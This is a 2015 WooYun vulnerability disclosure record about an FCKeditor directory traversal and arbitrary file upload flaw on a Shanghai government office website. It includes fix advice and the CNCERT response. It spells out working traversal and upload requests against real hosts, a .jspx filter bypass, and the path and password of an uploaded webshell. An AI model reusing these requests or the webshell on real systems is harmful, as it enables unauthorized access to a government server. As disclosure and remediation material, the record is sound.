{"id": 32518, "wybug_id": "wooyun-2015-0111030", "wybug_title": "上海侨务某系统存在任意文件上传及文件遍历漏洞#1", "wybug_corp": "上海市人民政府侨务办公室", "wybug_author": "茜茜公主", "wybug_date": "2015-05-14 11:12", "wybug_open_date": "2015-07-03 08:34", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-03：\t细节向公众公开  简要描述： fck任意文件上传及文件遍历漏洞 详细说明：  目标地址：http://bs.qwb.sh.gov.cn/qwb_inter/pages/T_QWB_CHIEFMAIL/new_edit.jsp\n\nip地址：同jk.qwb.sh.gov.cn，均为211.152.36.83\n\n问题原因：fck编辑器不正确配置fck地址：\nhttp://jk.qwb.sh.gov.cn/qwb_inter/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n以上文件遍历\n\n\n\n   漏洞证明：  文件上传：\nhttp://jk.qwb.sh.gov.cn/qwb_inter/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://jk.qwb.sh.gov.cn/qwb_inter/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\n\n\n需要上传jspx文件类型，jsp有跳转，跨目录传未尝试一句话地址：http://jk.qwb.sh.gov.cn/qwb_inter/UserFiles/Image/wooyun.jspx密码：0t2t3\n\n   修复方案：  正确配置fck，上传点过滤   版权声明：转载请注明来源 茜茜公主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-05-19 08:33 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发给上海分中心,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}